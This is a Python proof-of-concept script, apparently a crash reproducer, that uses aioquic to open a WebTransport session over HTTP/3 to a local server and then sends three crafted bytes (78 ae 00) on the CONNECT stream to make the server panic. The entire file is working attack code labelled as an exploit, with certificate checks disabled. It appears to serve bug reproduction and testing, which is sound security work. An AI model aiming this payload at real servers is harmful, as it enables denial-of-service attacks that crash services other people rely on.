import asyncio
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived

class WebTransportPanicClient(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http = None
        self._session_id = None

    def quic_event_received(self, event):
        # Initialize H3 connection once QUIC is ready
        if self._http is None:
            self._http = H3Connection(self._quic)
        
        # Forward events to H3 layer
        for h3_event in self._http.handle_event(event):
            if isinstance(h3_event, HeadersReceived):
                for name, value in h3_event.headers:
                    if name == b":status" and value == b"200":
                        print("✔ Session Established. Sending exploit bytes...")
                        self._session_id = h3_event.stream_id
                        self.trigger_panic()

    def trigger_panic(self):
        # These are the 3 bytes from your log: 78 ae 00
        # In WebTransport/HTTP3, 0x78 is interpreted as a Capsule Type.
        payload = b"\x78\xae\x00"
        
        # Send raw bytes directly to the established CONNECT stream
        self._quic.send_stream_data(self._session_id, payload, end_stream=False)
        self.transmit()
        print(f"Payload transmitted. Check server logs for panic.")

async def run_exploit():
    configuration = QuicConfiguration(
        alpn_protocols=H3_ALPN,
        is_client=True,
        verify_mode=False 
    )

    async with connect(
        "127.0.0.1",
        4433,
        configuration=configuration,
        create_protocol=WebTransportPanicClient,
    ) as protocol:
        # Wait for the connection to be established
        await protocol.wait_connected()
        
        # Manually initiate the WebTransport CONNECT request
        stream_id = protocol._quic.get_next_available_stream_id()
        headers = [
            (b":method", b"CONNECT"),
            (b":protocol", b"webtransport"),
            (b":scheme", b"https"),
            (b":authority", b"localhost"),
            (b":path", b"/echo"),
        ]
        protocol._http.send_headers(stream_id, headers)
        protocol.transmit()

        # Give the server time to respond and process the follow-up payload
        await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(run_exploit())
    except Exception as e:
        print(f"\nConnection closed: {e}")
        print("If the server panicked, the connection was likely reset by the host.")
